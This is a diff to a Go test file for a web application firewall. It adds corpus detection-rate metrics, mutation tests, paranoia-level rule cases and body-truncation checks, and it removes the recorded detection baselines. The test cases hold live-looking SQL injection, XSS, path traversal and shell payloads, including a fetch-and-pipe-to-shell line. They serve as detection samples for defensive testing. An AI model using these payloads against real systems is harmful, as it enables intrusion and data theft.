@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"mime/multipart"
@@ -167,14 +168,19 @@ type corpusSample struct {
 	group, target, value string
 }
 
-func TestManagedCorpusTPRFPR(t *testing.T) {
+func TestWAFCorpusMetrics(t *testing.T) {
 	rules := loadManagedRules(t)
 	phase, err := NewPhase(rules, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
-	attacks := readCorpus(t, "heldout", "attacks.tsv")
-	clean := readCorpus(t, "heldout", "clean.tsv")
+	corpusDir := corpusDirectory(t)
+	attackFile, cleanFile := "attacks-v2.tsv", "clean-v2.tsv"
+	if os.Getenv("WAF_CORPUS_DIR") != "" {
+		attackFile, cleanFile = "attacks.tsv", "clean.tsv"
+	}
+	attacks := readCorpusFile(t, corpusDir, attackFile)
+	clean := readCorpusFile(t, corpusDir, cleanFile)
 	attackCounts := make(map[string]int)
 	for _, sample := range attacks {
 		attackCounts[sample.group]++
@@ -184,17 +190,14 @@ func TestManagedCorpusTPRFPR(t *testing.T) {
 			t.Fatalf("attack group %s has %d samples; want at least 40", group, count)
 		}
 	}
-	baselineBytes, err := os.ReadFile(filepath.Join("..", "..", "..", "test", "corpus", "waf", "heldout", "tpr-baseline.json"))
-	if err != nil {
-		t.Fatal(err)
-	}
-	var baseline map[string]float64
-	if err := json.Unmarshal(baselineBytes, &baseline); err != nil {
-		t.Fatal(err)
-	}
 	fprMax := corpusThreshold(t, "WAF_FPR_MAX", 0)
 	tprMin := corpusThreshold(t, "WAF_TPR_MIN", 0)
-	t.Log("metric\tgroup\tparanoia\tdetected/total\trate\tbaseline\tthreshold")
+	label := "DEV"
+	if os.Getenv("WAF_CORPUS_DIR") != "" {
+		label = "EXTERNAL"
+	}
+	t.Logf("%s corpus=%s attacks=%d clean=%d", label, corpusDir, len(attacks), len(clean))
+	t.Log("metric\tgroup\tparanoia\tdetected/total\trate\tthreshold")
 	for paranoia := 1; paranoia <= 4; paranoia++ {
 		attackHits := make(map[string]int)
 		attackTotal := make(map[string]int)
@@ -202,6 +205,8 @@ func TestManagedCorpusTPRFPR(t *testing.T) {
 			attackTotal[sample.group]++
 			if hasCorpusTag(phase, sample, paranoia, sample.group) {
 				attackHits[sample.group]++
+			} else if paranoia == 1 {
+				t.Logf("%s MISS\t%s\t%s\t%q", label, sample.group, sample.target, sample.value)
 			}
 		}
 		groups := make([]string, 0, len(attackTotal))
@@ -211,14 +216,9 @@ func TestManagedCorpusTPRFPR(t *testing.T) {
 		sort.Strings(groups)
 		for _, group := range groups {
 			rate := float64(attackHits[group]) / float64(attackTotal[group])
-			key := fmt.Sprintf("%s/%d", group, paranoia)
-			minimum, ok := baseline[key]
-			if !ok {
-				t.Fatalf("missing recorded TPR baseline %s", key)
-			}
-			t.Logf("TPR\t%s\t%d\t%d/%d\t%.3f\t%.3f\t%.3f", group, paranoia, attackHits[group], attackTotal[group], rate, minimum, tprMin)
-			if rate+1e-12 < minimum || rate+1e-12 < tprMin {
-				t.Errorf("TPR %s paranoia %d = %.3f, below baseline %.3f or minimum %.3f", group, paranoia, rate, minimum, tprMin)
+			t.Logf("%s TPR\t%s\t%d\t%d/%d\t%.3f\t%.3f", label, group, paranoia, attackHits[group], attackTotal[group], rate, tprMin)
+			if tprMin > 0 && rate+1e-12 < tprMin {
+				t.Errorf("%s TPR %s paranoia %d = %.3f, below configured minimum %.3f", strings.ToLower(label), group, paranoia, rate, tprMin)
 			}
 		}
 
@@ -239,7 +239,7 @@ func TestManagedCorpusTPRFPR(t *testing.T) {
 		sort.Strings(cleanGroups)
 		for _, group := range cleanGroups {
 			rate := float64(cleanHits[group]) / float64(cleanTotal[group])
-			t.Logf("FPR\t%s\t%d\t%d/%d\t%.3f\t-\t%.3f", group, paranoia, cleanHits[group], cleanTotal[group], rate, fprMax)
+			t.Logf("%s FPR\t%s\t%d\t%d/%d\t%.3f\t%.3f", label, group, paranoia, cleanHits[group], cleanTotal[group], rate, fprMax)
 			if rate > fprMax+1e-12 {
 				t.Errorf("FPR %s paranoia %d = %.3f, exceeds configured maximum %.3f", group, paranoia, rate, fprMax)
 			}
@@ -250,6 +250,45 @@ func TestManagedCorpusTPRFPR(t *testing.T) {
 	}
 }
 
+func corpusDirectory(t *testing.T) string {
+	t.Helper()
+	if dir := os.Getenv("WAF_CORPUS_DIR"); dir != "" {
+		return dir
+	}
+	return filepath.Join("..", "..", "..", "test", "corpus", "waf", "dev")
+}
+
+func readCorpusFile(t *testing.T, dir, name string) []corpusSample {
+	t.Helper()
+	file, err := os.Open(filepath.Join(dir, name))
+	if err != nil {
+		t.Fatalf("open corpus %s: %v", filepath.Join(dir, name), err)
+	}
+	defer func() {
+		if err := file.Close(); err != nil {
+			t.Errorf("close external corpus %s: %v", name, err)
+		}
+	}()
+	var samples []corpusSample
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.TrimSpace(line) == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		parts := strings.SplitN(line, "\t", 3)
+		if len(parts) != 3 {
+			t.Fatalf("%s malformed corpus line %q", name, line)
+		}
+		value := strings.NewReplacer(`\n`, "\n", `\r`, "\r", `\t`, "\t").Replace(parts[2])
+		samples = append(samples, corpusSample{group: parts[0], target: parts[1], value: value})
+	}
+	if err := scanner.Err(); err != nil {
+		t.Fatal(err)
+	}
+	return samples
+}
+
 func TestDevCorpusTPR(t *testing.T) {
 	rules := loadManagedRules(t)
 	phase, err := NewPhase(rules, nil)
@@ -257,15 +296,7 @@ func TestDevCorpusTPR(t *testing.T) {
 		t.Fatal(err)
 	}
 	attacks := readCorpus(t, "dev", "attacks.tsv")
-	baselineBytes, err := os.ReadFile(filepath.Join("..", "..", "..", "test", "corpus", "waf", "dev", "tpr-baseline.json"))
-	if err != nil {
-		t.Fatal(err)
-	}
-	var baseline map[string]float64
-	if err := json.Unmarshal(baselineBytes, &baseline); err != nil {
-		t.Fatal(err)
-	}
-	t.Log("DEV metric\tgroup\tparanoia\tdetected/total\trate\tbaseline")
+	t.Log("LEGACY DEV metric\tgroup\tparanoia\tdetected/total\trate")
 	for paranoia := 1; paranoia <= 4; paranoia++ {
 		hits, totals := map[string]int{}, map[string]int{}
 		for _, sample := range attacks {
@@ -281,14 +312,7 @@ func TestDevCorpusTPR(t *testing.T) {
 		sort.Strings(groups)
 		for _, group := range groups {
 			rate := float64(hits[group]) / float64(totals[group])
-			minimum, ok := baseline[fmt.Sprintf("%s/%d", group, paranoia)]
-			if !ok {
-				t.Errorf("missing dev baseline for %s/%d", group, paranoia)
-			}
-			t.Logf("DEV TPR\t%s\t%d\t%d/%d\t%.3f\t%.3f", group, paranoia, hits[group], totals[group], rate, minimum)
-			if rate+1e-12 < minimum {
-				t.Errorf("dev TPR %s paranoia %d = %.3f below baseline %.3f", group, paranoia, rate, minimum)
-			}
+			t.Logf("LEGACY DEV TPR\t%s\t%d\t%d/%d\t%.3f", group, paranoia, hits[group], totals[group], rate)
 		}
 	}
 }
@@ -298,19 +322,20 @@ func TestAttackMutations(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	attacks := readCorpus(t, "dev", "attacks.tsv")
-	var total, caught int
+	attacks := readCorpus(t, "dev", "attacks-v2.tsv")
+	var caughtBaseTotal, caughtBaseHits, missedBaseTotal, missedBaseHits int
 	var misses []string
 	for _, sample := range attacks {
-		if sample.group != "sqli" && sample.group != "xss" && sample.group != "rce" && sample.group != "ssrf" {
+		if sample.group == "protocol" {
 			continue
 		}
+		baseDetected := hasCorpusTag(phase, sample, 1, sample.group)
 		encoded := strings.ReplaceAll(url.QueryEscape(sample.value), "+", "%20")
 		doubleEncoded := strings.ReplaceAll(url.QueryEscape(encoded), "+", "%20")
 		mutations := []string{encoded, doubleEncoded}
 		switch sample.group {
 		case "sqli":
-			mutations = append(mutations, strings.ToUpper(sample.value), "雪"+sample.value)
+			mutations = append(mutations, strings.ToUpper(sample.value))
 			if strings.Contains(sample.value, " ") {
 				mutations = append(mutations, strings.ReplaceAll(sample.value, " ", "/**/"), strings.ReplaceAll(sample.value, " ", "\t"))
 			}
@@ -321,22 +346,41 @@ func TestAttackMutations(t *testing.T) {
 			variant := strings.NewReplacer("<script", "<ScRiPt", "</script", "</ScRiPt", "onerror", "OnErRoR", "onload", "OnLoAd", "onfocus", "OnFoCuS", "onbegin", "OnBeGiN", "ontoggle", "OnToGgLe").Replace(sample.value)
 			mutations = append(mutations, variant, strings.ReplaceAll(sample.value, " ", "\t"))
 		case "rce":
-			mutations = append(mutations, "雪"+sample.value, strings.ReplaceAll(sample.value, " ", "\t"))
+			mutations = append(mutations, strings.ReplaceAll(sample.value, " ", "\t"))
 		case "ssrf":
-			mutations = append(mutations, strings.ToUpper(sample.value), "雪"+sample.value)
+			mutations = append(mutations, strings.ToUpper(sample.value))
+		default:
+			if strings.Contains(sample.value, " ") {
+				mutations = append(mutations, strings.ReplaceAll(sample.value, " ", "\t"))
+			}
 		}
 		for _, mutation := range mutations {
-			total++
-			candidate := corpusSample{group: sample.group, target: "rawargs", value: mutation}
-			if hasCorpusTag(phase, candidate, 1, sample.group) {
-				caught++
+			candidate := corpusSample{group: sample.group, target: sample.target, value: mutation}
+			got := hasCorpusTag(phase, candidate, 1, sample.group)
+			if baseDetected {
+				caughtBaseTotal++
+				if got {
+					caughtBaseHits++
+				}
 			} else {
-				misses = append(misses, sample.group+"\t"+mutation)
+				missedBaseTotal++
+				if got {
+					missedBaseHits++
+				}
+			}
+			if !got {
+				misses = append(misses, fmt.Sprintf("%s\tbase_detected=%v\t%s\t%q", sample.group, baseDetected, sample.target, mutation))
 			}
 		}
 	}
-	rate := float64(caught) / float64(total)
-	t.Logf("MUTATION caught=%d/%d rate=%.3f", caught, total, rate)
+	ratio := func(hits, total int) float64 {
+		if total == 0 {
+			return 0
+		}
+		return float64(hits) / float64(total)
+	}
+	t.Logf("MUTATION from_caught_samples=%d/%d rate=%.3f", caughtBaseHits, caughtBaseTotal, ratio(caughtBaseHits, caughtBaseTotal))
+	t.Logf("MUTATION from_missed_samples=%d/%d rate=%.3f", missedBaseHits, missedBaseTotal, ratio(missedBaseHits, missedBaseTotal))
 	for _, miss := range misses {
 		t.Logf("MUTATION MISS\t%s", miss)
 	}
@@ -348,12 +392,12 @@ func TestNewManagedRulesPositiveNegative(t *testing.T) {
 		t.Fatal(err)
 	}
 	cases := []struct{ id, group, target, positive, negative string }{
-		{"waf-sqli-heldout-001", "sqli", "args", "name=' OR 9=9", "name=order status for report"},
-		{"waf-xss-heldout-001", "xss", "args", "<svg><animate onbegin=alert(1)>", "SVG animation event documentation"},
-		{"waf-rce-heldout-001", "rce", "args", "cmd=%0a/usr/bin/id", "python code prints hello"},
-		{"waf-ssrf-heldout-001", "ssrf", "args", "url=http://[::1]:8080/admin", "url=http://203.0.113.10/public"},
-		{"waf-sensitive-files-heldout-001", "sensitive", "path", "/actuator/env", "/.well-known/security.txt"},
-		{"waf-scanner-ua-heldout-001", "scanner", "ua", "Mozilla/5.0 WPScan/3.8", "Mozilla/5.0 Chrome/130"},
+		{"waf-sqli-p4c-001", "sqli", "args", "name=' OR 9=9", "name=order status for report"},
+		{"waf-xss-p4c-001", "xss", "args", "<svg><animate onbegin=alert(1)>", "SVG animation event documentation"},
+		{"waf-rce-p4c-001", "rce", "args", "cmd=%0a/usr/bin/id", "python code prints hello"},
+		{"waf-ssrf-p4c-001", "ssrf", "args", "url=http://[::1]:8080/admin", "url=http://203.0.113.10/public"},
+		{"waf-sensitive-files-p4c-001", "sensitive", "path", "/actuator/env", "/.well-known/security.txt"},
+		{"waf-scanner-ua-p4c-001", "scanner", "ua", "Mozilla/5.0 WPScan/3.8", "Mozilla/5.0 Chrome/130"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.id, func(t *testing.T) {
@@ -364,6 +408,76 @@ func TestNewManagedRulesPositiveNegative(t *testing.T) {
 			negative := corpusDecision(phase, corpusSample{group: tc.group, target: tc.target, value: tc.negative}, 1)
 			if containsString(negative.Tags, tc.group) {
 				t.Fatalf("negative sample matched: %+v", negative)
+			}
+		})
+	}
+}
+
+func TestParanoiaRulesHaveLevelSpecificPositiveAndNegativeCases(t *testing.T) {
+	rules := loadManagedRules(t)
+	cases := []struct{ id, tag, target, positive, negative string }{
+		{"waf-sqli-p2-001", "sqli-boolean", "args", "q=1 OR name RLIKE name", "q=search for RLIKE documentation"},
+		{"waf-sqli-p3-001", "sqli-union", "args", "q=1 UNION DISTINCT SELECT email FROM accounts", "q=union distinct names in a list"},
+		{"waf-sqli-p4-001", "sqli-exfiltration", "args", "q=INTO DUMPFILE /tmp/out", "q=download an outfile report"},
+		{"waf-rce-p2-001", "shell-enumeration", "args", "cmd=;printf PATH=$PATH", "cmd=printf PATH in a shell tutorial"},
+		{"waf-rce-p3-001", "shell-pipeline", "args", "cmd=curl x.invalid | sh", "cmd=curl a page and print a result"},
+		{"waf-rce-p4-001", "shell-obfuscation", "args", "cmd=base64 -d /tmp/x | sh; chmod +x /bin/x", "cmd=base64 -d file in a guide"},
+		{"waf-traversal-p2-001", "encoded-traversal", "args", "file=..%2fsecret.txt", "file=report%2fsummary.txt"},
+		{"waf-traversal-p3-001", "unicode-traversal", "args", "file=%u002e%u002e%2fsecret", "file=normal-image.png"},
+		{"waf-traversal-p4-001", "lfi", "path", "/../etc/passwd", "/etc/hosts.example"},
+		{"waf-deser-p2-001", "serialized-object", "args", "v=!!python/object:builtins.object", "v=python object serialization guide"},
+		{"waf-deser-p3-001", "gadget-chain", "args", "v=payload.__reduce__()", "v=reduce the collection size"},
+		{"waf-deser-p4-001", "gadget-chain", "args", "v=java.security.SignedObject", "v=java security signed objects documentation"},
+	}
+	byID := make(map[string]Rule, len(rules))
+	for _, rule := range rules {
+		byID[rule.ID] = rule
+	}
+	for _, tc := range cases {
+		t.Run(tc.id, func(t *testing.T) {
+			rule, ok := byID[tc.id]
+			if !ok {
+				t.Fatalf("rule not loaded: %s", tc.id)
+			}
+			phase, err := NewPhase([]Rule{rule}, nil)
+			if err != nil {
+				t.Fatal(err)
+			}
+			positive := corpusDecision(phase, corpusSample{group: tc.tag, target: tc.target, value: tc.positive}, rule.Paranoia)
+			if !containsString(positive.Tags, tc.tag) {
+				t.Fatalf("level %d positive did not match: %+v", rule.Paranoia, positive)
+			}
+			negative := corpusDecision(phase, corpusSample{group: tc.tag, target: tc.target, value: tc.negative}, rule.Paranoia)
+			if containsString(negative.Tags, tc.tag) {
+				t.Fatalf("level %d negative matched: %+v", rule.Paranoia, negative)
+			}
+		})
+	}
+}
+
+func TestP4DWeakGroupRulesHavePositiveAndNegativeCases(t *testing.T) {
+	rules := loadManagedRules(t)
+	phase, err := NewPhase(rules, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	cases := []struct {
+		name, group, target, positive, negative string
+	}{
+		{"sqli numeric comparison", "sqli", "args", "id=7 OR 8>2", "id=7 or higher is allowed"},
+		{"sqli having tautology", "sqli", "args", "id=7 HAVING 6=6", "id=7 having six records"},
+		{"rce encoded newline", "rce", "args", "cmd=x%0aid", "cmd=show id examples"},
+		{"deserialization typed json marker", "deserialization", "json", `{"$type":"System.Diagnostics.Process"}`, `{"type":"documentation"}`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			positive := corpusDecision(phase, corpusSample{group: tc.group, target: tc.target, value: tc.positive}, 2)
+			if !containsString(positive.Tags, tc.group) {
+				t.Fatalf("positive missed: %+v", positive)
+			}
+			negative := corpusDecision(phase, corpusSample{group: tc.group, target: tc.target, value: tc.negative}, 2)
+			if containsString(negative.Tags, tc.group) {
+				t.Fatalf("negative matched: %+v", negative)
 			}
 		})
 	}
@@ -413,7 +527,7 @@ func TestWorstCaseShapesTakeConfiguredFailMode(t *testing.T) {
 				if mode == "closed" {
 					want = reqctx.ActionBlock
 				}
-				if decision.RuleID != "waf_budget" || decision.Action != want || !containsString(decision.Tags, "waf.budget_exceeded") {
+				if decision.RuleID != "waf_budget" || decision.Action != want || !containsString(decision.Tags, "waf_budget_exceeded") {
 					t.Fatalf("shape=%s mode=%s decision=%+v", shape, mode, decision)
 				}
 				reqctx.Release(ctx)
@@ -426,6 +540,11 @@ type delayedBody struct {
 	data    []byte
 	delayed bool
 }
+
+type failingBody struct{}
+
+func (failingBody) Read([]byte) (int, error) { return 0, errors.New("body read failed") }
+func (failingBody) Close() error             { return nil }
 
 func (r *delayedBody) Read(p []byte) (int, error) {
 	if !r.delayed {
@@ -462,8 +581,8 @@ func TestWorstCaseBodyLimitsAndBudgetFailMode(t *testing.T) {
 				if !ctx.BodyLoaded() || elapsed < 2*time.Millisecond {
 					t.Fatalf("body was not read within enforced budget path: loaded=%v elapsed=%s", ctx.BodyLoaded(), elapsed)
 				}
-				if got := len(ctx.BodyText()); got != kb*1024 || ctx.BodyTruncated() {
-					t.Fatalf("body boundary: got %d bytes truncated=%v, want exact %d-byte body", got, ctx.BodyTruncated(), kb*1024)
+				if got := len(ctx.BodyText()); got != maxBodyScanBytes || !ctx.BodyTruncated() {
+					t.Fatalf("WAF body prefix: got %d bytes truncated=%v, want %d-byte bounded prefix", got, ctx.BodyTruncated(), maxBodyScanBytes)
 				}
 				want := reqctx.ActionAllow
 				if failMode == "closed" {
@@ -475,13 +594,127 @@ func TestWorstCaseBodyLimitsAndBudgetFailMode(t *testing.T) {
 				if !strings.Contains(decision.Reason, "budget exceeded") {
 					t.Fatalf("budget reason missing: %+v", decision)
 				}
-				if !containsString(decision.Tags, "waf.budget_exceeded") {
+				if !containsString(decision.Tags, "waf_budget_exceeded") || !containsString(decision.Tags, "waf_body_truncated") {
 					t.Fatalf("budget tag missing: %+v", decision)
+				}
+				replayed, err := io.ReadAll(r.Body)
+				if err != nil || len(replayed) != kb*1024 {
+					t.Fatalf("origin replay lost body: len=%d err=%v want=%d", len(replayed), err, kb*1024)
 				}
 				reqctx.Release(ctx)
 			})
 		}
 	}
+}
+
+func TestLargeBodyAttackAtPrefixCannotBeSkipped(t *testing.T) {
+	phase, err := NewPhase(loadManagedRules(t), func() time.Time { return time.Time{} })
+	if err != nil {
+		t.Fatal(err)
+	}
+	payload := "id=1 UNION SELECT password FROM users&" + strings.Repeat("safe=1&", 40_000)
+	request := httptest.NewRequest(http.MethodPost, "http://edge.test/submit", strings.NewReader(payload))
+	request.Header.Set("Content-Type", "text/plain")
+	ctx := reqctx.New(request, nil, "large-body", nil)
+	ctx.Entitlements.MaxBodyBytes = 256 * 1024
+	ctx.Site = &wafcore.Site{ID: "s", Plan: "free", FailMode: "open", WAF: wafcore.WAFConfig{Mode: "block", Sensitivity: "medium", Paranoia: 1, BodyLimitKB: 256, BudgetMS: 2}}
+	decision := phase.Handle(ctx)
+	if decision.Action != reqctx.ActionBlock || !containsString(decision.Tags, "sqli") {
+		t.Fatalf("large body prefix escaped WAF: %+v", decision)
+	}
+	if !ctx.BodyTruncated() || len(ctx.BodyText()) != maxBodyScanBytes {
+		t.Fatalf("large body was not bounded: truncated=%v prefix=%d", ctx.BodyTruncated(), len(ctx.BodyText()))
+	}
+	replayed, err := io.ReadAll(request.Body)
+	if err != nil || len(replayed) != len(payload) {
+		t.Fatalf("origin replay: got %d bytes err=%v want=%d", len(replayed), err, len(payload))
+	}
+	reqctx.Release(ctx)
+}
+
+func TestBodyTruncationScoresAndPlanFailModeDefaults(t *testing.T) {
+	phase, err := NewPhase([]Rule{{ID: "body-probe", Phase: "request", Targets: []string{"body"}, Pattern: "^never-match$", Severity: "warning", Paranoia: 1}}, func() time.Time { return time.Time{} })
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		plan string
+		want string
+	}{{plan: "free", want: "open"}, {plan: "pro", want: "closed"}} {
+		t.Run(tc.plan, func(t *testing.T) {
+			request := httptest.NewRequest(http.MethodPost, "http://edge.test/submit", strings.NewReader(strings.Repeat("x", 16*1024)))
+			request.Header.Set("Content-Type", "text/plain")
+			ctx := reqctx.New(request, nil, "truncate", nil)
+			ctx.Entitlements.MaxBodyBytes = 16 * 1024
+			ctx.Site = &wafcore.Site{ID: "s", Plan: tc.plan, WAF: wafcore.WAFConfig{Mode: "monitor", Sensitivity: "high", BodyLimitKB: 16, TruncatedBodyScore: 3, BudgetMS: 2000}}
+			decision := phase.Handle(ctx)
+			if decision.RuleID != "waf_body_truncated" || decision.Score != 3 || !containsString(decision.Tags, "waf_body_truncated") {
+				t.Fatalf("truncation must be an anomaly with the configured score: %+v", decision)
+			}
+			if decision.Action != reqctx.ActionLogOnly {
+				t.Fatalf("monitor mode truncation action=%v, want log only", decision.Action)
+			}
+			budgetDecision := phase.budgetFailure(ctx, 0, "test budget")
+			want := reqctx.ActionAllow
+			if tc.want == "closed" {
+				want = reqctx.ActionBlock
+			}
+			if budgetDecision.Action != want {
+				t.Fatalf("plan %s budget action=%v, want %v", tc.plan, budgetDecision.Action, want)
+			}
+			reqctx.Release(ctx)
+		})
+	}
+}
+
+func TestUnscannedBodyIsMarkedAsTruncated(t *testing.T) {
+	phase, err := NewPhase([]Rule{{ID: "body-probe", Phase: "request", Targets: []string{"body"}, Pattern: "^never-match$", Severity: "warning", Paranoia: 1}}, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		name, contentType string
+		limit             int
+	}{
+		{name: "scan budget consumed before body", contentType: "application/json", limit: 1},
+		{name: "unsupported body media type", contentType: "application/octet-stream", limit: 4096},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			request := httptest.NewRequest(http.MethodPost, "http://edge.test/", strings.NewReader(strings.Repeat("x", 16*1024)))
+			request.Header.Set("Content-Type", tc.contentType)
+			ctx := reqctx.New(request, nil, "body-skip", nil)
+			ctx.Entitlements.MaxBodyBytes = 16 * 1024
+			ctx.Site = &wafcore.Site{ID: "s", FailMode: "open", WAF: wafcore.WAFConfig{Mode: "monitor", Sensitivity: "low", Paranoia: 1, BodyLimitKB: 16, ScanLimitBytes: tc.limit, TruncatedBodyScore: 3, BudgetMS: 2000}}
+			decision := phase.Handle(ctx)
+			if decision.Score != 3 || !containsString(decision.Tags, "waf_body_truncated") {
+				t.Fatalf("unscanned body must carry an anomaly score and tag: %+v", decision)
+			}
+			if ctx.BodyLoaded() {
+				t.Fatal("WAF buffered body despite skipping its scan")
+			}
+			reqctx.Release(ctx)
+		})
+	}
+}
+
+func TestBodyReadErrorIsMarkedAsTruncated(t *testing.T) {
+	phase, err := NewPhase([]Rule{{ID: "body-probe", Phase: "request", Targets: []string{"body"}, Pattern: "^never-match$", Severity: "warning", Paranoia: 1}}, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	request := httptest.NewRequest(http.MethodPost, "http://edge.test/submit", nil)
+	request.Body = failingBody{}
+	request.Header.Set("Content-Type", "text/plain")
+	ctx := reqctx.New(request, nil, "body-error", nil)
+	ctx.Site = &wafcore.Site{ID: "s", FailMode: "open", WAF: wafcore.WAFConfig{Mode: "block", Sensitivity: "high", Paranoia: 1, TruncatedBodyScore: 3}}
+	decision := phase.Handle(ctx)
+	if decision.RuleID != "waf_budget" || decision.Score != 3 || !containsString(decision.Tags, "waf_body_truncated") || !containsString(decision.Tags, "waf_budget_exceeded") {
+		t.Fatalf("body read error must leave a truncation anomaly: %+v", decision)
+	}
+	if decision.Action != reqctx.ActionAllow {
+		t.Fatalf("explicit fail-open on read error: got %v", decision.Action)
+	}
+	reqctx.Release(ctx)
 }
 
 func containsString(values []string, want string) bool {
@@ -766,7 +999,9 @@ func BenchmarkWAFWorstCase(b *testing.B) {
 				b.ReportAllocs()
 				b.SetBytes(int64(limit))
 				b.ResetTimer()
+				latencies := make([]int64, 0, min(b.N, 256))
 				for i := 0; i < b.N; i++ {
+					started := time.Now()
 					r := httptest.NewRequest(http.MethodPost, "http://edge.test/submit", strings.NewReader(payload))
 					r.Header.Set("Content-Type", contentType)
 					c := reqctx.New(r, nil, "bench", nil)
@@ -774,7 +1009,13 @@ func BenchmarkWAFWorstCase(b *testing.B) {
 					c.Site = &wafcore.Site{ID: "bench", WAF: wafcore.WAFConfig{Mode: "monitor", Sensitivity: "low", Paranoia: 4, BodyLimitKB: kb, BudgetMS: 2}}
 					_ = phase.Handle(c)
 					reqctx.Release(c)
+					if i < 256 {
+						if elapsed := time.Since(started).Nanoseconds(); elapsed > 0 {
+							latencies = append(latencies, elapsed)
+						}
+					}
 				}
+				reportLatencyPercentiles(b, latencies)
 			})
 		}
 	}
@@ -788,14 +1029,39 @@ func BenchmarkWAFWorstCase(b *testing.B) {
 		}
 		b.ReportAllocs()
 		b.ResetTimer()
+		latencies := make([]int64, 0, min(b.N, 256))
 		for i := 0; i < b.N; i++ {
+			started := time.Now()
 			r := httptest.NewRequest(http.MethodGet, "http://edge.test/search?"+query.String(), nil)
 			c := reqctx.New(r, nil, "bench", nil)
 			c.Site = &wafcore.Site{ID: "bench", WAF: wafcore.WAFConfig{Mode: "monitor", Sensitivity: "low", Paranoia: 4, BudgetMS: 2}}
 			_ = phase.Handle(c)
 			reqctx.Release(c)
+			if i < 256 {
+				if elapsed := time.Since(started).Nanoseconds(); elapsed > 0 {
+					latencies = append(latencies, elapsed)
+				}
+			}
 		}
+		reportLatencyPercentiles(b, latencies)
 	})
+}
+
+func reportLatencyPercentiles(b *testing.B, samples []int64) {
+	b.Helper()
+	if len(samples) < 10 {
+		return
+	}
+	sort.Slice(samples, func(i, j int) bool { return samples[i] < samples[j] })
+	pick := func(percentile int) int64 {
+		index := (len(samples)*percentile + 99) / 100
+		if index < 1 {
+			index = 1
+		}
+		return samples[index-1]
+	}
+	b.ReportMetric(float64(pick(50)), "p50-ns")
+	b.ReportMetric(float64(pick(99)), "p99-ns")
 }
 
 func repeatToLimit(value string, limit int) string {
